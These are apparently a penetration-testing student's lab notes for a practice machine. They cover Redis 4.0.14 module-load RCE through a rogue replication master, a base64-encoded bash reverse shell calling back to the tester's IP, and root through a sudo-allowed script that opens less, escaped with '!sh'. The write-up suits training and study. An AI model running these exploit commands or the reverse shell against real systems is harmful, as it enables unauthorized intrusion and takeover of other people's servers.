
Target IP: 192.168.111.176
My IP (tun0): 192.168.45.166

Route: fully manual — no Metasploit. Redis RCE → base64 reverse shell → sudo pager escape.

---

## Recon

```bash
nmap -sV -sC -p- 192.168.111.176
```

Output:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store 4.0.14
```

Two ports — SSH and Redis. Redis 4.0.14 is unauthenticated and running as a privileged user → known RCE path.

- Port 22 → potential pivot / file-transfer / catch point for a callback.
- Port 6379 (Redis) → not a default web port, so research this product+version on GitHub / Exploit-DB / searchsploit.

---

## Initial Access — Redis RCE (manual, no msfvenom)

**Vulnerability:** Redis 4.x/5.x can load external `.so` files as modules. If Redis is unauthenticated, you make the target replicate (`SLAVEOF`) from a rogue Redis master you control, deliver a malicious module during replication, then `MODULE LOAD` it for command execution.

**Tool:** `redis-rce.py` (Ridter/redis-rce). The `.so` is the other half — `make` wouldn't compile cleanly, so grabbed a prebuilt `exp_lin.so` (the module that registers `system.exec` / `system.rev`).

```bash
python redis-rce.py -r 192.168.111.176 -p 6379 -L 192.168.45.166 -f exp_lin.so
```

Halfway through it offers `[i]nteractive` or `[r]everse` shell:
- **Reverse (`system.rev`) didn't call back** — nothing landed on the listener. The module's built-in revshell was the problem, not the exec primitive.
- **Interactive (`system.exec`) worked but is janky** — no TTY, each command runs independently, output is messy.

**Getting a real foothold from the janky interactive shell:**
Since `system.exec` *does* run commands, used it to fire a proper reverse shell. Base64-encoded a bash reverse shell so quoting/special chars survive, then decoded + piped to bash inside the interactive shell:

```bash
# build the payload on Kali
echo -n 'bash -i >& /dev/tcp/192.168.45.166/443 0>&1' | base64
# -> run inside the interactive shell:
echo <BASE64> | base64 -d | bash
```

Caught it on `nc -lvnp 443` → shell as **prudence**. Stabilise:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why base64:** the interactive `system.exec` shell mangles raw reverse-shell one-liners (redirects, quotes). Encoding sidesteps the parsing issues — decode on target and pipe to a real shell.


---

## Privilege Escalation — sudo pager escape

linpeas (or just `sudo -l`) flagged:
```
User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

prudence can run `redis-status` as root with no password. Inspect it:
```bash
cat /usr/local/bin/redis-status
```
- Hardcoded auth key in plaintext: `ClimbingParrotKickingDonkey321` (installer mistake — credential baked into the file).
- It runs `/usr/bin/systemctl status redis`.

**Chain:**
1. `sudo /usr/local/bin/redis-status`
2. Script prompts for the auth key → paste `ClimbingParrotKickingDonkey321`
3. It calls `systemctl status redis`, whose output opens in a pager (`less`) — running as **root**
4. From inside `less`, type `!sh` (or `!/bin/bash`) → shell inherits root
5. `# id` → `uid=0(root)`

> **Pager escape (GTFOBins `less`/`systemctl`):** any root-run process that pipes through a pager (`less`, `more`, `man`, `vi`...) can be escaped with `!<command>`, and the spawned shell keeps the parent's privileges. The NOPASSWD sudo entry is what makes the whole chain run as root — the leaked key only gets you past the script's own prompt to reach the pager.

---

## Flags

```bash
cat /home/prudence/local.txt
cat /root/proof.txt
```

---

## Key Takeaways

- Always test for **unauthenticated Redis** — default installs have no auth, and 4.x/5.x = module-load RCE.
- When a built-in revshell won't call back, fall back to the exec primitive and **deliver your own base64 reverse shell** — more reliable than the canned one.
- `cat`/`strings` on a script or binary you can run as root often leaks **hardcoded creds**.
- `sudo -l` is the first privesc check after every foothold.
- **Pager escapes (`!sh` in `less`)** are a recurring OSCP privesc — the vuln is "root process opens a pager," not the credential.

---

## Related Notes

- [[Port-Overview-and-Priorities]]
- [[Linux_Common_Commands]]
- [[Linux_Priv_Esc]]
- [[ReverseShells]]
- [[SearchSploit]]
